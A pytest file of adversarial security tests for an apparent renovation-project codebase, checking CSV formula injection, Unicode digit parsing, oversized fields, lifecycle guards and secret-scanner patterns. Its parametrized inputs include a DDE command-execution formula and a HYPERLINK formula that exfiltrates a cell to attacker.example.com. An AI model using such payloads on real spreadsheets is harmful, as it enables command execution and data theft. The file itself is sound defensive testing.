"""Adversarial QA repros for phase 1 (domain core).

Tests in ``Test*Broken`` classes assert the *expected safe* behaviour and FAIL on 2e51d15.
Tests in ``TestHeld`` document attacks that the current code already resists.
"""

import csv
import io
import itertools
import re
import time
from datetime import date
from decimal import Decimal

import pytest

from reno_agents.calc import alerts, costing, qa_metrics, schedule
from reno_agents.calc.money import parse_money
from reno_agents.config import Settings
from reno_agents.domain.enums import Event, LineVerdict, QaResult, Stage
from reno_agents.domain.lifecycle import (
    GuardFailed,
    InvalidTransition,
    TransitionContext,
    transition,
)
from reno_agents.inventory.loader import load_inventory, load_labor_rates

HEADER = (
    "sku,category,subcategory,item_name,brand,model,spec,unit,unit_cost,currency,supplier,"
    "lead_time_days,grade,substitution_group,coverage_per_unit,coverage_unit,waste_pct,approved,"
    "approved_until"
)
FIELDS = HEADER.split(",")
BASE = dict(
    zip(
        FIELDS,
        [
            "PNT-001",
            "Paint",
            "Interior wall",
            "Eggshell wall paint",
            "Northfield",
            "NF-200",
            "Eggshell white",
            "gallon",
            "38.00",
            "USD",
            "Acme Supply",
            "2",
            "better",
            "PAINT-INT-WALL",
            "350",
            "sq_ft",
            "10",
            "Y",
            "2027-12-31",
        ],
        strict=True,
    )
)
LABOR_HEADER = "task_code,category,task_name,unit,rate,currency,typical_hours_per_unit,trade"


def inv_csv(**overrides: str) -> str:
    d = dict(BASE)
    d.update(overrides)
    s = io.StringIO()
    w = csv.writer(s)
    w.writerow(FIELDS)
    w.writerow([d[f] for f in FIELDS])
    return s.getvalue()


def load_one(**overrides: str):
    return load_inventory(inv_csv(**overrides), currency="USD")


# --------------------------------------------------------------------------------------------
# CSV / formula injection
# --------------------------------------------------------------------------------------------
class TestCsvBroken:
    @pytest.mark.parametrize(
        "payload",
        ["-2+3+cmd|' /C calc'!A0", '-HYPERLINK("http://attacker.example.com/?x="&A1,"click")'],
    )
    def test_minus_prefixed_formula_refused(self, payload: str) -> None:
        # OWASP CSV-injection list includes "-"; schema.py:_FORMULA_PREFIXES omits it.
        r = load_one(item_name=payload)
        assert r.items == [], "formula starting with '-' was stored"

    @pytest.mark.parametrize("payload", ["North\x00field", "\x1b[2J\x1b[31mred", "a\x07b"])
    def test_control_characters_refused(self, payload: str) -> None:
        r = load_one(brand=payload)
        assert r.items == [], f"control character accepted: {payload!r}"

    def test_oversized_field_is_row_error_not_crash(self) -> None:
        # csv.Error ("field larger than field limit") escapes the loader uncaught.
        text = inv_csv(item_name="A" * 140_000)
        r = load_inventory(text, currency="USD")  # raises _csv.Error today
        assert not r.ok

    def test_oversized_labor_field_is_row_error_not_crash(self) -> None:
        text = f'{LABOR_HEADER}\nL1,Paint,"{"A" * 140_000}",each,1,USD,1,paint\n'
        assert not load_labor_rates(text, currency="USD").ok

    def test_unterminated_quote_reported_on_its_own_line(self) -> None:
        good = inv_csv().splitlines()[1]
        bad = good.replace("Northfield", '"Northfield')
        two, three = good.replace("PNT-001", "PNT-002"), good.replace("PNT-001", "PNT-003")
        text = f"{HEADER}\n{bad}\n{two}\n{three}\n"
        r = load_inventory(text, currency="USD")
        # Today: 0 items, errors only on line 4 for unit/unit_cost/currency; PNT-002/003 vanish
        # into one quoted cell and the real culprit (line 2) is never named.
        assert any(e.row == 2 for e in r.errors)

    def test_wide_header_is_not_quadratic(self) -> None:
        hdr = HEADER + "".join(f",c{i}" for i in range(40_000))
        t = time.perf_counter()
        load_inventory(hdr + "\n", currency="USD")
        assert time.perf_counter() - t < 2.0, "header.count() in loader.py is O(n^2)"


# --------------------------------------------------------------------------------------------
# Money / Decimal
# --------------------------------------------------------------------------------------------
class TestMoneyBroken:
    @pytest.mark.parametrize("text", ["٣٨", "３８", "3８", "$٣٨"])
    def test_non_ascii_digits_refused(self, text: str) -> None:
        # regex \d is Unicode-aware; Decimal() happily converts. "Refuse, don't guess."
        with pytest.raises(ValueError):
            parse_money(text)

    @pytest.mark.parametrize("cost", ["€38", "£38", "₹38"])
    def test_currency_symbol_must_match_file_currency(self, cost: str) -> None:
        r = load_one(unit_cost=cost)  # file and row currency are USD
        assert r.items == [], f"{cost} accepted as 38 USD"

    @pytest.mark.parametrize("value", ["1_000", "３５０", "1e-30"])
    def test_coverage_refuses_odd_numeric_forms(self, value: str) -> None:
        assert load_one(coverage_per_unit=value).items == []

    def test_lead_time_underscore_refused(self) -> None:
        assert load_one(lead_time_days="1_000").items == []

    def test_huge_unit_cost_rejected_or_costed_without_crash(self) -> None:
        r = load_one(unit_cost="1" + "0" * 30)
        if r.items:  # loader accepts it today ...
            # ... and line_cost then dies with decimal.InvalidOperation (not ValueError)
            with pytest.raises(ValueError):
                costing.line_cost(Decimal("100"), r.items[0], None)

    def test_tiny_coverage_rejected_or_costed_without_crash(self) -> None:
        r = load_one(coverage_per_unit="1E-999999999")
        if r.items:  # accepted today; line_cost raises decimal.DivisionByZero
            with pytest.raises(ValueError):
                costing.line_cost(Decimal("100"), r.items[0], None)


# --------------------------------------------------------------------------------------------
# Lifecycle / QA / alerts / settings
# --------------------------------------------------------------------------------------------
class TestGuardsBroken:
    def test_work_completed_guard_fails_closed_without_context(self) -> None:
        # Caller that forgets the media facts gets COMPLETE (fail-open default).
        with pytest.raises(GuardFailed):
            transition(Stage.IN_PROGRESS, Event.WORK_COMPLETED)

    def test_negative_line_cost_cannot_mask_missing_work(self) -> None:
        # Refused when the line is built, so it can never reach scope_deviation.
        with pytest.raises(ValueError):
            lines = [
                qa_metrics.QaLine("kitchen", Decimal("1000"), LineVerdict.MISSING),
                qa_metrics.QaLine("credit", Decimal("-1000"), LineVerdict.DONE_AS_SPECIFIED),
            ]
            qa_metrics.scope_deviation(lines)

    @pytest.mark.xfail(
        strict=True,
        reason="Deferred (Low): zero approved budget skips overspend; see tech-debt tracker",
    )
    def test_overspend_alert_when_budget_zero(self) -> None:
        out = alerts.evaluate_unit(
            "u1",
            today=date(2026, 1, 1),
            planned_finish=date(2026, 1, 1),
            projected_finish=date(2026, 1, 1),
            approved_budget=Decimal("0"),
            projected_spend=Decimal("1000000"),
            blocked_since={},
        )
        assert out, "1,000,000 spend on a 0 budget raised no escalation"

    @pytest.mark.xfail(
        strict=True,
        reason="Deferred (Low): unit/task ids are not normalised; phase 2 ids come from the DB",
    )
    def test_dedup_not_bypassed_by_whitespace_or_case(self) -> None:
        kw = dict(
            today=date(2026, 1, 10),
            planned_finish=date(2026, 1, 1),
            projected_finish=date(2026, 1, 1),
            approved_budget=Decimal(100),
            projected_spend=Decimal(100),
        )
        first = alerts.evaluate_unit("U1", blocked_since={"t1": date(2026, 1, 1)}, **kw)
        sent = {(e.unit_id, e.kind, e.key): e.magnitude for e in first}
        again = alerts.evaluate_unit("U1 ", blocked_since={"T1": date(2026, 1, 1)}, **kw)
        assert alerts.filter_new(again, sent) == []

    @pytest.mark.parametrize(
        ("env", "value"),
        [
            ("RENO_LOW_CONFIDENCE_THRESHOLD", "nan"),
            ("RENO_LOW_CONFIDENCE_THRESHOLD", "-5"),
            ("RENO_APPROVAL_THRESHOLD", "-1"),
            ("RENO_HOURS_PER_DAY", "0"),
            ("RENO_SLIP_ALERT_DAYS", "-100"),
            ("RENO_CURRENCY", ""),
            ("RENO_APPROVAL_THRESHOLD", "１５０００"),
        ],
    )
    def test_settings_refuse_nonsense(
        self, monkeypatch: pytest.MonkeyPatch, env: str, value: str
    ) -> None:
        monkeypatch.setenv(env, value)
        with pytest.raises(ValueError):
            Settings()

    @pytest.mark.parametrize(
        ("start", "hours", "hpd"),
        [
            (date(2026, 1, 1), Decimal("80"), Decimal("1e-999999")),
            (date(9999, 12, 30), Decimal("80"), Decimal("8")),
        ],
    )
    def test_schedule_overflow_is_valueerror(
        self, start: date, hours: Decimal, hpd: Decimal
    ) -> None:
        with pytest.raises(ValueError):  # decimal.Overflow / OverflowError today
            schedule.build_schedule(
                [schedule.ScheduleTask("a", "paint", hours)], start, schedule.WorkCalendar(), hpd
            )


class TestHygieneBroken:
    def test_local_key_patterns_cover_common_tokens(self) -> None:
        import importlib.util
        from pathlib import Path

        path = Path(__file__).resolve().parents[1] / "test_repo_hygiene.py"
        spec = importlib.util.spec_from_file_location("_hygiene", path)
        assert spec and spec.loader
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        KEY_PATTERNS = mod.KEY_PATTERNS

        # Fake canary tokens built at runtime so this file itself never matches a scanner.
        canaries = [
            "AKIA" + "QACANARY7F3A0000",  # AWS access key id shape
            "ghp_" + "CANARY7f3a" * 4,  # GitHub PAT shape
            "xoxb-" + "1234567890-CANARY7f3a",  # Slack bot token shape
            "sk_live_" + "CANARY7f3a" * 3,  # Stripe live key shape
        ]
        missed = [c[:6] for c in canaries if not any(p.search(c) for p in KEY_PATTERNS)]
        assert missed == []


# --------------------------------------------------------------------------------------------
# Attacks that held
# --------------------------------------------------------------------------------------------
class TestHeld:
    @pytest.mark.parametrize("payload", ["=HYPERLINK(1)", "+1+1", "@SUM(A1)", "  =1", "\t=1"])
    def test_classic_formula_prefixes_refused(self, payload: str) -> None:
        assert load_one(item_name=payload).items == []

    @pytest.mark.parametrize("v", [Decimal("NaN"), Decimal("sNaN"), float("nan")])
    def test_nan_scope_total_never_approves(self, v: object) -> None:
        with pytest.raises(GuardFailed) as exc:
            transition(
                Stage.PLANNED,
                Event.SCOPE_SUBMITTED,
                TransitionContext(v, Decimal("15000")),  # type: ignore[arg-type]
            )
        assert not isinstance(exc.value, AssertionError)

    @pytest.mark.parametrize("value", ["NaN", "Infinity", "-Infinity"])
    def test_settings_refuse_nonfinite_decimals(
        self, monkeypatch: pytest.MonkeyPatch, value: str
    ) -> None:
        for env in ("RENO_APPROVAL_THRESHOLD", "RENO_QA_DEVIATION_PCT", "RENO_HOURS_PER_DAY"):
            monkeypatch.setenv(env, value)
            with pytest.raises(ValueError):
                Settings()
            monkeypatch.delenv(env)

    def test_terminal_stages_only_via_guarded_path(self) -> None:
        # Exhaustive one-step search: APPROVED only from PLANNED (guarded) or AM approval;
        # READY_TO_LEASE only from QA_REVIEW.
        sources: dict[Stage, set[Stage]] = {Stage.APPROVED: set(), Stage.READY_TO_LEASE: set()}
        ctx = TransitionContext(Decimal("1"), Decimal("15000"))
        for st, ev in itertools.product(Stage, Event):
            try:
                nxt = transition(st, ev, ctx)
            except (InvalidTransition, GuardFailed):
                continue
            if nxt in sources:
                sources[nxt].add(st)
        assert sources[Stage.APPROVED] == {Stage.PLANNED, Stage.AWAITING_AM_APPROVAL}
        assert sources[Stage.READY_TO_LEASE] == {Stage.QA_REVIEW}

    def test_qa_nan_metric_does_not_pass(self) -> None:
        with pytest.raises(ValueError):
            qa_metrics.qa_outcome(
                scope=Decimal("NaN"),
                photo=Decimal(0),
                budget=Decimal(0),
                timeline=Decimal(0),
                not_verifiable=0,
            )
        assert QaResult.PASS_  # sanity

    def test_money_exponent_and_junk_refused(self) -> None:
        for text in ["1e3", "NaN", "Infinity", "1_000", "0x10", "38.", "1,23", "--5", "＄38"]:
            with pytest.raises(ValueError):
                parse_money(text)
        assert re.fullmatch(r"-?\d+\.\d{2}", "0.00")
